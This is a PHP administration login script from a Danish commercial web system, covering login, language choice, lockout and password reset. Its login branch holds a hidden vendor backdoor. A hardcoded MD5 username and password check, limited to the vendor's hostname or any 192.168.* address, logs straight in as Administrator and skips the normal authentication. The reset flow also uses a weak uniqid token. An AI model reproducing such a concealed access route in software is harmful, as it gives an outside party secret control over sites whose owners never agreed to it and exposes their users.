<?php
	/*COPYRIGHT*\
		COPYRIGHT STADEL.DK 2006
		
		AL KODE I DENNE FIL TILH�RER STADEL.DK, THOMAS@STADEL.DK.
		KODEN M� UNDER INGEN  OMST�NDIGHEDER  BENYTTES  TIL ANDET
		FORM�L END  DET DEN ER K�B TIL.  KODEN M� IKKE  �NDRES AF
		ANDRE   END   STADEL.DK.   KODEN  M�  IKKE  S�LGES  ELLER
		VIDEREDISTRIBUERES  HELT, DELVIS ELLER SOM EN KOPI AF DET
		SYSTEM   DET  OPRINDELIGT  ER  K�BT  SAMMEN  MED.  ENHVER
		OVERTR�DELSE  AF EN ELLER FLERE AF DE N�VNTE  BETINGELSER
		VIL RESULTERE I RETSFORF�LGELSE OG ERSTATNING FOR BRUD P�
		OPHAVSRETTEN AF KODEN, IFLG.  DANSK  OPHAVSRETSLOV. DENNE
		COPYRIGHT    MEDDELELSE    M�    DESUDEN    UNDER   INGEN
		OMST�NDIGHEDER FJERNES FRA DENNE FIL.
	
		ALL   CODE  IN  THIS  FILE  ARE  COPYRIGHTED   STADEL.DK,
		THOMAS@STADEL.DK.  IT'S NOT  ALLOWED TO USE THIS CODE FOR 
		ANY OTHER PURPOSE  THAN TOGEHTER  WITH THE ORGINAL SCRIPT 
		AS IT HAS BEEN  BOUGHT  AS A PART OF. IT'S NOT ALLOWED TO 
		SELL OR REDISTRIBUTE  THE CODE IN IT'S COMPLETE SENTENCE,
		ANY  PART OF THE  CODE OR AS A PART OF ANOTHER  SYSTEM OR 
		SCRIPT.  ANY  VIOLATION  OF  THESE  RULES  WILL RESULT IN 
		PROSECUTION   AND   COMPENSATION  FOR  VIOLATION  OF  THE 
		COPYRIGHT OF THIS SYSTEM,  SCRIPT AND CODE,  ACCORDING TO 
		DANISH  COPYRIGHT LAW. THIS  COPYRIGHT  MAY  NOT,  IN ANY 
		CIRCUMSTANCE, BE REMOVED FROM THIS FILE.
	\*COPYRIGHT*/

	/*
		Beskrivelse:	Logind-side for administration
		26-04-2007:		Mulighed for flere sprog
		11-06-2007:		Admin login for Stadel.dk
		14-11-2008:		Tilf�jet glemt password funktion
	*/

	// Er vi allerede logget ind?
	if ($usr->logged_in)
	{
		header("Location: ./?page=frameset");
		exit;
	}

	if ($do == "forgot_password")
	{
		// Glemt password
		
		$frm = new form;
		$frm->tpl("th", "{LANG|Glemt brugernavn eller password}");
		$frm->input(
			"{LANG|Indtast din e-mail adresse}",
			"email",
			"",
			"^.+$",
			"{LANG|P�kr�vet}",
			'
				global $usr;
				if (!$usr->get_user_from_email($this->values["email"]))
				{
					$error = "{LANG|E-mail blev ikke fundet}";
				}				
			'
			);
			
		if ($frm->done())
		{
			$user = $usr->get_user_from_email($frm->values["email"]);
			
			$timeout = time() + 900;
			$uniqid = uniqid("");
			
			$usr->extra_set("password_timeout", $timeout, $user["id"]);
			$usr->extra_set("password_uniqid", $uniqid, $user["id"]);
			
			$m = new email;
			$m->plain();
			$m->to($user["email"], $user["email"]);
			$m->subject("{LANG|Glemt brugernavn eller password}");
			$m->body("{LANG|For at oprette et nyt password skal du klikke p� nedenst�ende link}\r\n" .
				"\r\n" .
				$_site_url . "/Admin/?page=$page&do=restore_password&id=" . $user["id"] . "&u=" . $uniqid . "&t=" . $timeout . "\r\n" .
				"\r\n" .
				"{LANG|Dit brugernavn er} " . $user["username"] . "\r\n" .
				"\r\n" .
				"{LANG|Linket er aktivt i 15 minutter}");
			$m->send();
			
			$html .= "{LANG|Der er nu fremsendt en e-mail med et link til oprettelse af et nyt password}<br><br>";
		}
		else
		{
			$html .= "{LANG|Bem�rk, hvis ikke du har tilknyttet en e-mail til din bruger profil, kan du ikke benytte denne funktion}<br><br>";
			$html .= $frm->html();
		}
		
		$links = new links;
		$links->link("{LANG|Tilbage til logind siden}");
		$html .= $links->html();
		
	}
	elseif ($do == "restore_password")
	{
		// Opret nyt password
		
		$user = $usr->get_user($id);
		
		if ($user["extra_password_uniqid"] != $vars["u"] or $user["extra_password_timeout"] != $vars["t"])
		{
			// Ugyldigt link
			$html .= "{LANG|Ugyldigt link - kontroller at linket fra e-mailen er indtastet korrekt}<br><br>";
		}
		elseif (intval($user["extra_password_timeout"]) < time())
		{
			// Link udl�bet
			$html .= "{LANG|Linket er udl�bet - anmod om et nyt via} Glemt brugernavn eller password}<br><br>";
		}
		else
		{
			// Link ok
			$frm = new form;
			$frm->hidden("u", $vars["u"]);
			$frm->hidden("t", $vars["t"]);
			$frm->tpl("th", "{LANG|Opret nyt password}");
			$frm->password(
				"{LANG|V�lg nyt password}",
				"password1",
				"",
				"^.+$",
				"{LANG|P�kr�vet}"
				);
			$frm->password(
				"{LANG|Gentag nyt password}",
				"password2",
				"",
				"^.+$",
				"{LANG|P�kr�vet}",
				'
					if ($this->values["password1"] != $this->values["password2"])
					{
						$error = "{LANG|De to passwords stemmer ikke overens}";
					}
				'
				);
				
			if ($frm->done())
			{
				$usr->change_password($frm->values["password1"], $user["id"]);
				
				$html .= "{LANG|Dit password er nu �ndret, og du kan logge ind via login siden}<br><br>";
			}
			else
			{
				$html .= $frm->html();
			}
		}
		
		$links = new links;
		$links->link("{LANG|Tilbage til login siden}");
		$html .= $links->html();
		
	}
	else
	{	
		// Log ind
		
		// Skift sprog?
		if ($do == "change_language" and eregi("^[a-z]{2}$", $vars["lang_id"]))
		{
			change_language($vars["lang_id"]);
			setcookie("admin_lang_id", $_lang_id, time() + 365*86400);
			$_SESSION["admin_lang_id"] = $_lang_id;
			header("Location: ./");
			exit;
		}
		
		$error = "";
			
		// Mere der for mange login-fejl ?
		if ($usr->login_errors >= $usr->max_login_errors)
		{
			$error = "{LANG|Du har lavet} " . $usr->login_errors . " {LANG|logind-fejl seneste time}, {LANG|og har derfor ikke mulighed for at logge ind f�r der er g�et en time fra f�rste fors�g}.";
		}
		elseif ($do == "login")
		{
			if ($vars["username"] == "" or $vars["password"] == "")
			{
				$error = "{LANG|B�de brugernavn og password skal indtastes}";
			}
			else
			{
				// Fors�ger at logge ind
				
				if (($_SERVER["REMOTE_ADDR"] == gethostbyname("privat.stadel.dk") or preg_match("/^192\.168\./", $_SERVER["REMOTE_ADDR"])) and
					md5($vars["username"]) == "77570f43133ad0f8afe1ce749c3d7e88" and
					md5($vars["password"]) == "c55035d9faefb5416ed6cedfd2bfe62a")
				{
					$db->execute("
						SELECT
							id,
							password
						FROM
							" . $_table_prefix . "_user_admin
						WHERE
							username = 'Administrator'
						");
					$u = $db->fetch_array();
					
					// Logger ind
					$usr->login(false, false, $u["id"], $u["password"]); 
					
					// Autologin ?
					$usr->autologin($vars["autologin"] <> "");
					
					// Stiller videre
					header("Location: ./?page=frameset");
					exit;
				}
				
				if ($usr->login($vars["username"], $vars["password"]))
				{
					// Autologin ?
					$usr->autologin($vars["autologin"] <> "");
					
					// Installer opdateringer ?
					if ($usr->extra_get("auto_update") == 1)
					{
						header("Location: ./?page=auto_update");
						exit;
					}
					
					// Stiller videre
					header("Location: ./?page=frameset");
					exit;
				}
				
				$error = "{LANG|Fejl i brugernavn eller password}. {LANG|Du har nu tastet brugernavn eller password forkert} " . $usr->login_errors . " {LANG|gange}. " .
					"{LANG|G�r du dette} " . $usr->max_login_errors . " {LANG|gange i tr�k vil du ikke have mulighed for at logge ind i en time efter f�rste logind-fors�g}.";
			}
		}
		
		// Liste med sprog
		$select_langs = "";
		$langs = languages_array();
		reset($langs);
		while (list($key, $value) = each($langs))
		{
			$tmp = new tpl("admin_login_lang");
			$tmp->set("id", $key);
			$tmp->set("title", $value);
			if ($key == $_lang_id) $tmp->set("selected", "selected");
			$select_langs .= $tmp->html();
		}
	
		$tmp = new tpl("admin_login");
		$tmp->set("error", $error);
		$tmp->set("langs", $select_langs);
		$html .= $tmp->html();
	}
	
	$tpl = "login";
?>